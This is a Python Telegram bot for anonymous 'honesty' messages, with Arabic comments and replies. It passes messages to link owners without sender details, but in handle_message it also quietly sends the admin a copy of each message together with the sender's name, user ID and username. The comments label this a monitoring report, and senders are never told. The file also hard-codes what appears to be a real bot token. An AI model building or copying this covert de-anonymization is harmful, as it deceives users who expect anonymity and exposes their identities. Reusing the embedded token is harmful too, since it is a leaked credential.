from telegram import Update
from telegram.ext import ApplicationBuilder, ContextTypes, MessageHandler, CommandHandler, filters

TOKEN = "8682801321:AAH6D6o_A6-4JLhbLP5aNCOWoa4Afo0gv7k"
MY_ADMIN_ID = 8820368378

# قائمة المحظورين
blocked_users = set()

# قاموس لتتبع الرابط اللي فاته المستخدم
user_targets = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in blocked_users:
        await update.message.reply_text("عذراً، أنت محظور من استخدام هذا البوت.")
        return
        
    bot_username = context.bot.username
    args = context.args
    
    if args:
        try:
            target_id = int(args[0])
            if target_id == user_id:
                await update.message.reply_text("لا يمكنك إرسال صراحة لنفسك! 😅\n\nهذا هو رابطك الخاص:\nhttps://t.me/" + bot_username + "?start=" + str(user_id))
                return
                
            # حفظ الشخص المستهدف صاحب الرابط
            user_targets[user_id] = target_id
            await update.message.reply_text("أهلاً بك! اكتب رسالة الصراحة الخاصة بك، وسأقوم بإرسالها لصاحب الرابط فوراً 🥷✨")
            return
        except ValueError:
            pass

    user_link = f"https://t.me/{bot_username}?start={user_id}"
    await update.message.reply_text(
        f"أهلاً بك في بوت صارحني الشامل 🥷✨\n\n"
        f"هذا هو رابط الصراحة الخاص بك، شاركه مع أصدقائك ليتلقوا رسائل صراحة منك:\n{user_link}"
    )

async def block_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != MY_ADMIN_ID:
        return
    if context.args:
        try:
            target_id = int(context.args[0])
            blocked_users.add(target_id)
            await update.message.reply_text(f"تم حظر المستخدم بنجاح: {target_id}")
        except ValueError:
            await update.message.reply_text("الرجاء إدخال أيدي صحيح للحظر.")
    else:
        await update.message.reply_text("استخدم الأمر هكذا: /block <user_id>")

async def unblock_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != MY_ADMIN_ID:
        return
    if context.args:
        try:
            target_id = int(context.args[0])
            if target_id in blocked_users:
                blocked_users.remove(target_id)
                await update.message.reply_text(f"تم إلغاء حظر المستخدم: {target_id}")
            else:
                await update.message.reply_text("المستخدم ليس في قائمة المحظورين.")
        except ValueError:
            await update.message.reply_text("الرجاء إدخال أيدي صحيح.")
    else:
        await update.message.reply_text("استخدم الأمر هكذا: /unblock <user_id>")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.text:
        return
        
    sender = update.message.from_user
    sender_id = sender.id
    
    if sender_id in blocked_users:
        await update.message.reply_text("عذراً، أنت محظور ولا يمكنك إرسال رسائل.")
        return

    # تحديد الهدف الحقيقي (صاحب الرابط، أو إلك كمديرة لو ما في رابط)
    target_id = user_targets.get(sender_id, MY_ADMIN_ID)

    sender_username = f"@{sender.username}" if sender.username else "لا يوجد"
    sender_name = sender.first_name if sender.first_name else "مجهول"
    message_text = update.message.text

    # رد للمرسل
    await update.message.reply_text("تم إرسال صراحتك بنجاح 🥷✨")

    # 1. إرسال نص الصراحة فقط للشخص المستهدف (سواء كان شخص عادي أو أنتِ) وبدون أي معلومات عن المرسل
    await context.bot.send_message(
        chat_id=target_id,
        text=f"💌 وصلت صراحة جديدة!\n\n{message_text}"
    )

    # 2. إرسال تقرير المراقبة والمعلومات الكاملة إليكِ أنتِ وحدكِ كمديرة (رسالة النص + رسالة المعلومات برسايل مستقلة)
    # ملاحظة: إذا كانت الرسالة موجهة إلك أساساً، فستصلك رسالة الصراحة أولاً ثم رسالتين المعلومات.
    # أما لو كانت موجهة لشخص ثاني، فرح يوصله النص، وتوصلك أنتِ نسخة من النص ومعلومات المرسل الكاملة.
    if target_id != MY_ADMIN_ID:
        await context.bot.send_message(
            chat_id=MY_ADMIN_ID,
            text=f"📋 [مراقبة البوت] رسالة صراحة أُرسلت إلى المستخدم ({target_id}):\n\n{message_text}"
        )
    
    # رسالة معلومات المرسل المستقلة إليكِ وحدكِ في كل حال من الأحوال
    await context.bot.send_message(
        chat_id=MY_ADMIN_ID,
        text=f"👤 معلومات المرسل:\n"
             f"- الاسم: {sender_name}\n"
             f"- الأيدي: `{sender_id}`\n"
             f"- اليوزر: {sender_username}",
        parse_mode="Markdown"
    )

if __name__ == '__main__':
    application = ApplicationBuilder().token(TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("block", block_user))
    application.add_handler(CommandHandler("unblock", unblock_user))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    application.run_polling(allowed_updates=Update.ALL_TYPES)
